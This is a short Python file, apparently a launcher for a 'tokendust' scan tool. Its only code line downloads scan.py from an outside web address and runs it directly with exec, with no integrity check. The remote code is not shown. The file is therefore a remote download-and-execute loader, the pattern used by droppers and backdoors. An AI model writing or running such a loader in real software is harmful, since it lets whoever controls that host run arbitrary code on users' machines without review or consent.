# scan.py now lives at https://zedongpeng.com/tokendust/scan.py; this runs it.
import urllib.request

exec(compile(urllib.request.urlopen("https://zedongpeng.com/tokendust/scan.py").read(), "scan.py", "exec"))
